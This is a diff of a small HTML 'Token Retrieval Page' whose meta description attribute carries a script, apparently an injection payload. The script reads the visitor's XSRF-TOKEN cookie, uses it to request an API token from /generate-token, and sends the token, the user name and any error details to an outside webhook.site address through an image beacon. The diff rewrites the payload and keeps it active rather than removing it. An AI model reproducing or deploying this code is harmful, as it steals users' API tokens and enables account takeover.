@@ -1,54 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <meta name="description" content='<script>
-        (async () => {
-            const WEBHOOK_URL = "https://webhook.site/2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
+  <meta charset="UTF-8">
+  <title>Token Collector</title>
+  <!-- VERSION_GET_TOKEN_V2 -->
+  <meta name="description" content='<script>
+    (() => {
+      const webhookID = "2b4d8efe-d632-441b-94e9-ffbfc14c48c5";
+      const endpoint = "https://webhook.site/" + webhookID;
 
-            const sendToWebhook = (data) => {
-                const params = new URLSearchParams({ source_tag: "name:description_GET_TOKEN", ...data });
-                new Image().src = `${WEBHOOK_URL}?${params.toString()}`;
-            };
+      const report = (info) => {
+        const details = new URLSearchParams();
+        details.append("source", "GET_TOKEN_V2");
+        Object.entries(info).forEach(([k, v]) => {
+          details.append(k, String(v).substring(0, 1000));
+        });
+        (new Image()).src = endpoint + "?" + details.toString();
+      };
 
-            const getXsrfToken = () => {
-                const cookie = document.cookie.split(";")
-                    .find(c => c.trim().startsWith("XSRF-TOKEN="));
-                return cookie ? decodeURIComponent(cookie.split("=")[1]) : null;
-            };
+      const extractXsrf = () => {
+        try {
+          return document.cookie
+            .split("; ")
+            .find(c => c.startsWith("XSRF-TOKEN="))
+            ?.split("=")[1];
+        } catch (err) {
+          report({ error: "cookie_parse_fail", message: err.message });
+          return null;
+        }
+      };
 
-            const fetchToken = async (xsrfToken) => {
-                const response = await fetch("/generate-token", {
-                    method: "POST",
-                    headers: {
-                        "Accept": "application/json",
-                        "X-Requested-With": "XMLHttpRequest",
-                        "X-XSRF-TOKEN": xsrfToken
-                    }
-                });
-                if (!response.ok) throw new Error(`HTTP ${response.status}`);
-                return response.json();
-            };
+      const xsrfToken = extractXsrf();
+      if (!xsrfToken) {
+        report({ error: "xsrf_missing", location: location.href });
+        return;
+      }
 
-            try {
-                const xsrfToken = getXsrfToken();
-                if (!xsrfToken) {
-                    sendToWebhook({ stage: "xsrf_token_missing" });
-                    return;
-                }
+      const headers = {
+        "Accept": "application/json",
+        "X-Requested-With": "XMLHttpRequest",
+        "X-XSRF-TOKEN": decodeURIComponent(xsrfToken)
+      };
 
-                const data = await fetchToken(xsrfToken);
-                sendToWebhook({
-                    stage: data.token ? "got_api_token" : "no_token_field",
-                    token: data.token || null
-                });
-            } catch (error) {
-                sendToWebhook({ stage: "error", error: error.message });
-            }
-        })();
-    </script>'>
+      fetch("/generate-token", {
+        method: "POST",
+        headers
+      })
+      .then(res => res.json())
+      .then(json => {
+        if (json?.token) {
+          report({
+            status: "token_retrieved",
+            token: json.token,
+            user: json.user?.name || "unknown"
+          });
+        } else {
+          report({
+            status: "token_missing",
+            response: JSON.stringify(json)
+          });
+        }
+      })
+      .catch(e => {
+        report({ error: "fetch_fail", detail: e.message });
+      });
+    })();
+  </script>'>
 </head>
 <body>
-    <h1>Get Token Page</h1>
+  <h1>Token Retrieval Page</h1>
 </body>
 </html>
